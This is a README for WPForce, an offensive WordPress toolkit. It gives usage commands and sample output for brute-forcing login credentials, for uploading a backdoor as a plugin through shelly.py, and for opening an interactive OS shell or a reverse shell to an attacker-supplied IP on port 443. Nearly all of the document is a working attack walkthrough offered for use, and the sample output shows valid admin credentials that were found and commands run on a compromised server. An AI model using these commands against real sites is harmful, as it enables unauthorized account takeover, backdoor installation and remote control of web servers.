# WPForce

###Wordpress Brute Force Attack Tool
###Last Updated: 2016-04-19

###ABOUT: 
###This tool uses the Wordpress API to brute force login credentials.  A second module i being developed for post exploitation.

##Standard brute force attack with wpforce.py:
```
USAGE: $ python wpforce.py -i usr.txt -w pass.txt -u "http://www.[website].com" 

   ,-~~-.___.       __        __ ____   _____
  / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
 (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
  \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
     ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
    /  \-'~;   ||     |
   /  __/~| ...||__/|-"   Brute Force Attack Tool for Wordpress
 =(  _____||________|                 ~n00py~

Username List: usr.txt (3)
Password List: pass.txt (21)
URL: http://www[website].com
--------------------------
[xxxxxxxxxxxxx@gmail.com : xxxxxxxxxxxxx] are valid credentials!  - THIS ACCOUNT IS ADMIN
--------------------------
--------------------------
[xxxxxxxxxxxxx@icloud.com : xxxxxxxxxxxx] are valid credentials!  
--------------------------
 100% Percent Complete
All correct pairs:
{'xxxxxxxxxxxxx@icloud.com': 'xxxxxxxxxxxxx', 'xxxxxxxxxxxxx@gmail.com': 'xxxxxxxxxxxxx'}
```
##Interactive shell upload with shelly.py:
```
python shelly.py -t "http://www.[website].com" -u "[username]@gmail.com" -p "[password]" -i
       ,-~~-.___.       __        __ ____   _____
      / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
     (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
      \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
         ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
        /  \-'~;   ||     |
       /  __/~| ...||__/|-"   Post-exploitation Module for Wordpress
     =(  _____||________|                 ~n00py~
    
Server Header: Apache/2
Probably a Linux server
Found Login Page
Logged in as Admin
Found CSRF Token: 679f202158
Backdoor uploaded!
Plugin installed successfully
Upload Directory: xhtnhgo
os-shell> id
Sending command: id
uid=4812176(dom.[website]) gid=15010(cgiuser) groups=15020,15010(cgiuser)

os-shell> 
```
##Reverse shell upload with shelly.py:
```
python shelly.py -t "http://www.[website].com" -u "[username]@gmail.com" -p "[password]" -lp 443 -li 10.0.0.0 -r
       ,-~~-.___.       __        __ ____   _____
      / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
     (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
      \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
         ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
        /  \-'~;   ||     |
       /  __/~| ...||__/|-"   Post-exploitation Module for Wordpress
     =(  _____||________|                 ~n00py~
    
Server Header: Apache/2
Probably a Linux server
Found Login Page
Logged in as Admin
Found CSRF Token: dcdc5108de
Backdoor uploaded!
Plugin installed successfully
Upload Directory: ugxdirx
Sending reverse shell to 10.0.0.0 port 443
 
```
